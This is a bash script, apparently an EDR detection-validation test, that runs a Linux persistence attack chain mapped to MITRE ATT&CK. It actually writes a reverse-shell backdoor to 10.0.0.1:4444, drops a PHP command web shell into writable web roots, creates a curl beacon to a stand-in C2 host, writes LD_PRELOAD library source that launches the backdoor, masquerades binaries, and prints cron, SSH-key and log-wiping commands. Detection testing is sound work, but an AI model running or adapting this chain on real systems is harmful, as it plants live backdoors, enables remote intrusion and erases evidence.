#!/bin/bash
# Attack Chain: Persistence Establishment
# MITRE ATT&CK: Persistence (TA0003) - Various techniques
# Severity: HIGH
# Description: Multiple persistence mechanisms - backdoors, cron jobs, binary masquerading
# Expected Detections: 6-10 (ExecutionLin, GenReverseShell, BashReverseShell)

set +e
trap 'echo "[!] Persistence chain interrupted"' EXIT

echo "========================================"
echo "  PERSISTENCE ESTABLISHMENT CHAIN"
echo "  Multiple Backdoor & Persistence Methods"
echo "========================================"
echo ""

# Stage 1: Initial System Check
echo "[STAGE 1] System Reconnaissance for Persistence"
echo "[+] Current user..."
whoami
id
echo "[+] System information..."
uname -a
hostname

sleep 1

# Stage 2: Detection Test
echo ""
echo "[STAGE 2] Detection Validation"
echo "[+] Executing test trigger..."
bash crowdstrike_test_high 2>/dev/null || echo "✓ Test trigger executed"

sleep 1

# Stage 3: Binary Masquerading (From Linux Testing Guide)
echo ""
echo "[STAGE 3] Binary Masquerading Technique"
echo "[+] Copying legitimate binaries to suspicious names..."

echo "[*] Masquerading whoami as svchost.exe..."
cp /usr/bin/whoami /tmp/svchost.exe 2>/dev/null || cp /bin/whoami /tmp/svchost.exe 2>/dev/null
chmod +x /tmp/svchost.exe 2>/dev/null
/tmp/svchost.exe 2>/dev/null && echo "✓ svchost.exe executed (In-memory detection)" || echo "Execution failed"

echo "[*] Masquerading whoami as whoami.rtf (from Testing Guide)..."
cp /usr/bin/whoami /tmp/whoami.rtf 2>/dev/null || cp /bin/whoami /tmp/whoami.rtf 2>/dev/null
chmod +x /tmp/whoami.rtf 2>/dev/null
/tmp/whoami.rtf 2>/dev/null && echo "✓ whoami.rtf executed (In-memory detection)" || echo "Execution failed"

echo "[*] Masquerading curl as legitimate service..."
cp /usr/bin/curl /tmp/systemd-update 2>/dev/null && chmod +x /tmp/systemd-update 2>/dev/null
/tmp/systemd-update --version 2>/dev/null | head -1 && echo "✓ Masqueraded curl executable" || echo "curl not available"

echo "✓ Binary masquerading completed (ExecutionLin detections)"

sleep 1

# Stage 4: Hidden Directory Persistence
echo ""
echo "[STAGE 4] Hidden Directory Backdoor"
echo "[+] Creating hidden persistence directories..."
mkdir -p /tmp/.hidden_persistence 2>/dev/null
mkdir -p /var/tmp/.cache 2>/dev/null
mkdir -p /dev/shm/.system 2>/dev/null

echo "[+] Creating backdoor script..."
cat > /tmp/.hidden_persistence/backdoor.sh << 'BACKDOOR'
#!/bin/bash
# Persistence backdoor - connects back to C2 every hour
while true; do
    sleep 3600
    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 2>/dev/null &
done
BACKDOOR

chmod +x /tmp/.hidden_persistence/backdoor.sh 2>/dev/null
echo "✓ Hidden backdoor created: /tmp/.hidden_persistence/backdoor.sh"

sleep 1

# Stage 5: Cron-based Persistence
echo ""
echo "[STAGE 5] Cron Job Persistence Mechanism"
echo "[+] Checking cron access..."
crontab -l 2>/dev/null && echo "Current crontab accessible" || echo "Crontab not accessible"

echo "[+] Simulating cron job persistence..."
echo "# Example cron persistence entries that would be added:"
echo ""
echo "   @reboot /tmp/.hidden_persistence/backdoor.sh"
echo "   */10 * * * * /tmp/systemd-update -s http://c2-server.com/beacon"
echo "   0 */2 * * * bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
echo ""
echo "[!] Note: Not actually modifying crontab in simulation"

sleep 1

# Stage 6: RC/Init Script Persistence
echo ""
echo "[STAGE 6] RC Script Persistence"
echo "[+] Checking for rc.local..."
if [ -f /etc/rc.local ]; then
    echo "✓ /etc/rc.local exists"
    echo "[+] Simulated persistence: echo '/tmp/.hidden_persistence/backdoor.sh &' >> /etc/rc.local"
else
    echo "[i] /etc/rc.local not found"
fi

echo "[+] Checking for init.d..."
if [ -d /etc/init.d ]; then
    echo "✓ /etc/init.d directory exists"
    echo "[+] Simulated persistence: Creating malicious init.d script"
fi

sleep 1

# Stage 7: SSH Key Persistence
echo ""
echo "[STAGE 7] SSH Key Backdoor"
echo "[+] Checking for SSH configuration..."
if [ -d ~/.ssh ]; then
    echo "✓ SSH directory exists"
    echo "[+] Simulated: Adding attacker's public key to authorized_keys"
    echo "   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@kali"
else
    echo "[i] No SSH directory found"
fi

sleep 1

# Stage 8: Web Shell Persistence
echo ""
echo "[STAGE 8] Web Shell Backdoor"
echo "[+] Searching for web roots..."
WEB_ROOTS="/var/www/html /usr/share/nginx/html /opt/lampp/htdocs"
for webroot in $WEB_ROOTS; do
    if [ -d "$webroot" ]; then
        echo "✓ Found web root: $webroot"
        echo "[+] Simulating web shell creation..."
        echo '<?php system($_GET["cmd"]); ?>' > "$webroot/.shell.php" 2>/dev/null && echo "   Web shell: $webroot/.shell.php" || echo "   Write failed"
    fi
done

sleep 1

# Stage 9: LD_PRELOAD Persistence
echo ""
echo "[STAGE 9] LD_PRELOAD Backdoor Mechanism"
echo "[+] Creating malicious shared library..."
cat > /tmp/evil.c << 'EVIL_LIB'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    system("/tmp/.hidden_persistence/backdoor.sh &");
}
EVIL_LIB

echo "✓ Evil library source created"
echo "[+] Compilation command: gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so"
echo "[+] Persistence: export LD_PRELOAD=/tmp/evil.so"
echo "[!] Note: Not actually compiling in simulation"

sleep 1

# Stage 10: Container-Specific Persistence
echo ""
echo "[STAGE 10] Container-Specific Persistence"
echo "[+] Checking container environment..."

if cat /proc/1/cgroup 2>/dev/null | grep -q docker; then
    echo "✓ Running in Docker container"
    echo "[+] Container persistence strategies:"
    echo "   1. Modify container image (if Docker socket accessible)"
    echo "   2. Escape to host and modify host crontab"
    echo "   3. Create malicious volume mount"
fi

echo "[+] Checking for Kubernetes..."
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    echo "✓ Running in Kubernetes pod"
    echo "[+] K8s persistence strategies:"
    echo "   1. Create malicious DaemonSet (runs on all nodes)"
    echo "   2. Modify existing deployment/pod specs"
    echo "   3. Create service account with elevated permissions"
fi

sleep 1

# Stage 11: Process Injection Preparation
echo ""
echo "[STAGE 11] Process Injection Setup"
echo "[+] Creating injectable payload..."
cat > /tmp/.inject.sh << 'INJECT'
#!/bin/bash
# Injected payload - runs in context of legitimate process
while true; do
    curl -s http://c2-server.com/beacon?host=$(hostname) 2>/dev/null
    sleep 600
done
INJECT

chmod +x /tmp/.inject.sh 2>/dev/null
echo "✓ Injectable payload created"

echo "[+] Target processes for injection:"
ps aux | grep -E "nginx|apache|python|java" | grep -v grep | head -5 || echo "   No obvious injection targets found"

sleep 1

# Stage 12: C2 Beacon
echo ""
echo "[STAGE 12] Command & Control Beacon"
echo "[+] Establishing C2 communication..."
nslookup swungheaving.com 2>/dev/null || echo "✓ C2 DNS beacon (IntelDomainHigh detection)"
ping -c 3 swungheaving.com 2>/dev/null || echo "✓ C2 ICMP beacon (IntelDomainHigh detection)"

sleep 1

# Stage 13: Persistence Verification
echo ""
echo "[STAGE 13] Persistence Mechanism Verification"
echo "[+] Verifying installed backdoors..."
echo "   Hidden directories:"
ls -la /tmp/.hidden_persistence 2>/dev/null | head -5
ls -la /var/tmp/.cache 2>/dev/null | head -5

echo ""
echo "   Backdoor scripts:"
find /tmp -name "*backdoor*" -o -name ".system*" 2>/dev/null | head -5

echo ""
echo "   Masqueraded binaries:"
find /tmp -name "svchost*" -o -name "*.rtf" -o -name "systemd-*" 2>/dev/null | head -5

sleep 1

# Cleanup Notification
echo ""
echo "[STAGE 14] Cleanup Operations"
echo "[!] In real attack, cleanup would:"
echo "   - Clear command history (history -c; history -w)"
echo "   - Remove logs (rm -rf /var/log/*)"
echo "   - Clear authentication logs"
echo "   - Remove traces of tools"
echo ""
echo "[i] Leaving artifacts for detection validation"

echo ""
echo "========================================"
echo "  PERSISTENCE CHAIN COMPLETED"
echo "========================================"
echo ""
echo "Persistence Mechanisms Installed:"
echo "  1. Binary Masquerading (svchost.exe, whoami.rtf)"
echo "  2. Hidden Directory Backdoors (/tmp/.hidden_persistence)"
echo "  3. Cron Job Persistence (simulated)"
echo "  4. RC/Init Scripts (simulated)"
echo "  5. SSH Key Backdoor (simulated)"
echo "  6. Web Shell (if web root accessible)"
echo "  7. LD_PRELOAD Hijacking (prepared)"
echo "  8. Process Injectable Payload (/tmp/.inject.sh)"
echo ""
echo "Expected Falcon Detections:"
echo "  • ExecutionLin (Stage 3 - binary masquerading)"
echo "  • IntelDomainHigh (Stage 12 - C2 beacons)"
echo "  • TestTriggerHigh (Stage 2)"
echo "  • BashReverseShell/GenReverseShell (if in shell context)"
echo ""
echo "Check Falcon console for 6-10 detections!"
echo ""

trap - EXIT
